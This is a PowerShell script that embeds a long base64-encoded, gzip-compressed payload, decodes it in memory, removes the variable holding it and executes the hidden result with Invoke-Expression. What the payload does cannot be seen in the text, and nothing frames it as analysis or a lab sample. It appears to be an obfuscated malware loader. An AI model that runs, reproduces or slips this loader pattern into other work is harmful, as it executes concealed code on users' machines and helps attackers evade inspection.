function Decompress-FromBase64 {
    param([string]$b64)
    $bytes = [System.Convert]::FromBase64String($b64)
    $ms = New-Object System.IO.MemoryStream(, $bytes)
    $gs = New-Object System.IO.Compression.GzipStream($ms, [IO.Compression.CompressionMode]::Decompress)
    $sr = New-Object System.IO.StreamReader($gs)
    return $sr.ReadToEnd()
}

$payload = @'
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
IgAA
'@

try {
    $scriptText = Decompress-FromBase64 $payload
    # Optionally delete the $payload variable to reduce memory footprint
    Remove-Variable payload -ErrorAction SilentlyContinue
    # Execute the reconstructed script
    iex $scriptText
} catch {
    Write-Error "Failed to decompress/execute payload: $_"
}
